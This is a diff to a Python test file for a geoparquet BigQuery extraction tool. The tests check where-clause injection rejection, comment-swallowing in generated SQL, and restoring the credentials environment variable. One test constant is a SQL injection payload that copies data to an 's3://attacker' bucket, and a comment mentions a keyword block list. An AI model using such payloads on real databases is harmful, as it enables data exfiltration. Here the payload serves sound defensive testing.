@@ -473,6 +473,116 @@ class TestDryRun:
         assert result is None
 
 
+class TestWhereClauseValidation:
+    """--where must be routed through validate_where_clause (gpio #612 parity).
+
+    A statement-separator injection must be rejected before any network call,
+    on both the dry-run path and the real (non-dry-run) path.
+    """
+
+    INJECTION_WHERE = "1=1); COPY (SELECT 1) TO 's3://attacker/x'; --"
+
+    def test_dry_run_rejects_semicolon_injection(self):
+        """Dry-run must reject a ';' statement separator before printing SQL."""
+        from geoparquet_io.core.exceptions import ValidationError
+        from geoparquet_io.core.extract_bigquery import extract_bigquery
+
+        with pytest.raises(ValidationError, match="not a single filtering expression"):
+            extract_bigquery(
+                table_id="project.dataset.table",
+                dry_run=True,
+                where=self.INJECTION_WHERE,
+            )
+
+    # Blocklisted keywords (GRANT, DROP, DELETE) appear inside quoted literals
+    # here, so a validator that uppercases the whole clause rejects them.
+    @pytest.mark.parametrize(
+        "clause",
+        [
+            "name = 'Grant County'",
+            "descr ILIKE '%drop off%'",
+            "REPLACE(zip, '-', '') = '19104'",
+        ],
+    )
+    def test_dry_run_allows_legitimate_where(self, clause):
+        """A legitimate --where does not raise on the dry-run path."""
+        from geoparquet_io.core.extract_bigquery import extract_bigquery
+
+        result = extract_bigquery(
+            table_id="project.dataset.table",
+            dry_run=True,
+            where=clause,
+        )
+        assert result is None
+
+    @patch("geoparquet_io.core.extract_bigquery._setup_bigquery_connection")
+    def test_real_path_rejects_injection_before_network(self, mock_setup):
+        """Non-dry-run path must validate before establishing a BigQuery connection."""
+        from geoparquet_io.core.exceptions import ValidationError
+        from geoparquet_io.core.extract_bigquery import extract_bigquery
+
+        mock_setup.side_effect = AssertionError(
+            "network connection attempted before where-clause validation"
+        )
+
+        with pytest.raises(ValidationError, match="not a single filtering expression"):
+            extract_bigquery(
+                table_id="project.dataset.table",
+                dry_run=False,
+                where=self.INJECTION_WHERE,
+            )
+
+        mock_setup.assert_not_called()
+
+
+def _strip_line_comments(sql: str) -> str:
+    """Drop everything a ``--`` comment would swallow, line by line."""
+    return "\n".join(line.split("--")[0] for line in sql.splitlines())
+
+
+class TestWhereClauseCannotSwallowLaterClauses:
+    """A trailing ``--`` in --where must not comment out the rest of the query."""
+
+    TRAILING_COMMENT_WHERE = "1=1) --"
+
+    def test_build_bigquery_query_keeps_limit(self):
+        from geoparquet_io.core.extract_bigquery import _build_bigquery_query
+
+        sql = _build_bigquery_query(
+            con=None,
+            validated_table_id="project.dataset.table",
+            select_cols="*",
+            bbox=None,
+            bbox_mode="auto",
+            bbox_threshold=1000,
+            geom_col=None,
+            where=self.TRAILING_COMMENT_WHERE,
+            limit=10,
+        )
+        assert "LIMIT 10" in _strip_line_comments(sql)
+
+    def test_dry_run_sql_keeps_bbox_and_limit(self, monkeypatch):
+        import geoparquet_io.core.extract_bigquery as bq_module
+
+        printed: list[str] = []
+        monkeypatch.setattr(bq_module, "progress", printed.append)
+
+        bq_module._handle_dry_run(
+            validated_table_id="project.dataset.table",
+            include_list=None,
+            bbox="0,0,1,1",
+            bbox_mode="local",
+            bbox_threshold=1000,
+            where=self.TRAILING_COMMENT_WHERE,
+            limit=10,
+        )
+
+        sql = next(line for line in printed if line.startswith("SQL: "))
+        live_sql = _strip_line_comments(sql)
+        assert "ST_Intersects" in live_sql
+        assert "LIMIT 10" in live_sql
+
+
 class TestPythonAPI:
     """Test the Python API for BigQuery."""
 
@@ -504,12 +614,12 @@ class TestBigQueryConnection:
     @patch("geoparquet_io.core.extract_bigquery.get_duckdb_connection")
     def test_connection_loads_extensions_in_order(self, mock_get_con):
         """Test that spatial is loaded before bigquery, and bigquery install uses try/except."""
-        from geoparquet_io.core.extract_bigquery import get_bigquery_connection
+        from geoparquet_io.core.extract_bigquery import _setup_bigquery_connection
 
         mock_con = MagicMock()
         mock_get_con.return_value = mock_con
 
-        get_bigquery_connection()
+        _setup_bigquery_connection()
 
         # Verify get_duckdb_connection was called with spatial=True
         mock_get_con.assert_called_once_with(load_spatial=True, load_httpfs=False)
@@ -522,12 +632,12 @@ class TestBigQueryConnection:
     @patch("geoparquet_io.core.extract_bigquery.get_duckdb_connection")
     def test_connection_no_deprecated_geography_setting(self, mock_get_con):
         """Test that deprecated bq_geography_as_geometry is NOT set (v1.5+)."""
-        from geoparquet_io.core.extract_bigquery import get_bigquery_connection
+        from geoparquet_io.core.extract_bigquery import _setup_bigquery_connection
 
         mock_con = MagicMock()
         mock_get_con.return_value = mock_con
 
-        get_bigquery_connection()
+        _setup_bigquery_connection()
 
         calls = [call[0][0] for call in mock_con.execute.call_args_list]
         geom_setting_calls = [c for c in calls if "geography_as_geometry" in c.lower()]
@@ -538,12 +648,12 @@ class TestBigQueryConnection:
     @patch("geoparquet_io.core.extract_bigquery.get_duckdb_connection")
     def test_connection_sets_arrow_compression(self, mock_get_con):
         """Test that bq_arrow_compression is set for efficient data transfer."""
-        from geoparquet_io.core.extract_bigquery import get_bigquery_connection
+        from geoparquet_io.core.extract_bigquery import _setup_bigquery_connection
 
         mock_con = MagicMock()
         mock_get_con.return_value = mock_con
 
-        get_bigquery_connection()
+        _setup_bigquery_connection()
 
         calls = [call[0][0] for call in mock_con.execute.call_args_list]
         compression_calls = [c for c in calls if "bq_arrow_compression" in c.lower()]
@@ -552,7 +662,7 @@ class TestBigQueryConnection:
     @patch("geoparquet_io.core.extract_bigquery.get_duckdb_connection")
     def test_connection_handles_install_race(self, mock_get_con):
         """Test that bigquery INSTALL failure (race condition) is handled gracefully."""
-        from geoparquet_io.core.extract_bigquery import get_bigquery_connection
+        from geoparquet_io.core.extract_bigquery import _setup_bigquery_connection
 
         mock_con = MagicMock()
         mock_get_con.return_value = mock_con
@@ -566,17 +676,48 @@ class TestBigQueryConnection:
         mock_con.execute.side_effect = execute_side_effect
 
         # Should not raise — INSTALL failure is caught internally
-        get_bigquery_connection()
+        _setup_bigquery_connection()
 
     @patch("geoparquet_io.core.extract_bigquery._setup_bigquery_connection")
     def test_credentials_file_validation(self, mock_setup):
         """Test that non-existent credentials file raises error."""
-        from geoparquet_io.core.extract_bigquery import get_bigquery_connection
+        from geoparquet_io.core.extract_bigquery import BigQueryConnection
 
         mock_setup.return_value = MagicMock()
 
         with pytest.raises(FileNotFoundError, match="Credentials file not found"):
-            get_bigquery_connection(credentials_file="/nonexistent/path/credentials.json")
+            with BigQueryConnection(credentials_file="/nonexistent/path/credentials.json"):
+                pass
+
+    @patch("geoparquet_io.core.extract_bigquery._setup_bigquery_connection")
+    def test_credentials_env_var_is_restored(self, mock_setup, tmp_path, monkeypatch):
+        """The only credentials path must restore GOOGLE_APPLICATION_CREDENTIALS."""
+        import os
+
+        from geoparquet_io.core.extract_bigquery import BigQueryConnection
+
+        mock_setup.return_value = MagicMock()
+        creds = tmp_path / "sa.json"
+        creds.write_text("{}")
+
+        monkeypatch.delenv("GOOGLE_APPLICATION_CREDENTIALS", raising=False)
+        with BigQueryConnection(credentials_file=str(creds)):
+            assert os.environ["GOOGLE_APPLICATION_CREDENTIALS"] == str(creds)
+        assert "GOOGLE_APPLICATION_CREDENTIALS" not in os.environ
+
+        monkeypatch.setenv("GOOGLE_APPLICATION_CREDENTIALS", "/host/creds.json")
+        with BigQueryConnection(credentials_file=str(creds)):
+            assert os.environ["GOOGLE_APPLICATION_CREDENTIALS"] == str(creds)
+        assert os.environ["GOOGLE_APPLICATION_CREDENTIALS"] == "/host/creds.json"
+
+    def test_no_unrestored_credentials_helper(self):
+        """The env-mutating helper with no restore must not exist any more."""
+        import geoparquet_io.core.extract_bigquery as bq
+
+        assert not hasattr(bq, "get_bigquery_connection"), (
+            "get_bigquery_connection set GOOGLE_APPLICATION_CREDENTIALS without "
+            "restoring it; BigQueryConnection is the only supported entry point"
+        )
 
     @patch("geoparquet_io.core.extract_bigquery._setup_bigquery_connection")
     def test_context_manager_no_deprecated_geography_setting(self, mock_setup):
